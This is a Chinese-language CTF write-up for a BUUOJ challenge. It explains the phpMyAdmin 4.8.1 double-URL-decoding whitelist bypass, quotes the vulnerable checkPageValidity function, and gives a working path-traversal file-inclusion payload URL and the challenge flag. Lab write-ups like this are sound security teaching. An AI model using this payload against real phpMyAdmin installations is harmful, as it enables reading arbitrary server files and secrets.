# [GWCTF 2019]我有一个数据库

[题目地址](https://buuoj.cn/challenges#[GWCTF%202019]%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93)

进入网站，只得到一堆乱码。dirmap扫一下，竟然发现个phpmyadmin。直接进去，我们就到数据库里面了。flag当然不在数据库里，怎么可能这么简单呢？此题的考点是phpmyadmin 4.8.1的一个任意文件包含漏洞。参考[这里](https://www.freebuf.com/articles/web/279489.html)和[这里](https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog)。

简述一下这个漏洞。index.php里有一句`include $_REQUEST['target'];`，不过target的值需要满足检查，出现漏洞的检查如下：

```php
public static function checkPageValidity(&$page, array $whitelist = [])
    {
        if (empty($whitelist)) {
            $whitelist = self::$goto_whitelist;
        }
        if (! isset($page) || !is_string($page)) {
            return false;
        }

        if (in_array($page, $whitelist)) {
            return true;
        }

        $_page = mb_substr(
            $page,
            0,
            mb_strpos($page . '?', '?')
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }

        $_page = urldecode($page);
        $_page = mb_substr(
            $_page,
            0,
            mb_strpos($_page . '?', '?')
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }

        return false;
    }
```

注意到`$_page = urldecode($page);`又对传入的page做了一次urldecode，而传入参数时已经默认解码一次了，代表这是第二次解码。如果我们在传入的文件名中二次url编码一个问号，就能绕过过滤，从而使用路径穿越。这个设计本来是想让参数也带有参数时还可以正确包含，比如`?target=xxx.php?xxx`这种。结果因为这个漏洞，加上php的include函数解析路径时如果有相对路径就会忽略前面的路径转而包含相对路径的文件这个特性，导致任意文件包含。构造payload。

- http://83878456-a710-4e71-9a95-44708cb1e6ea.node4.buuoj.cn:81/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../flag

## Flag
> flag{18e67a6e-d91c-4cb4-b332-cd16cdb6342a}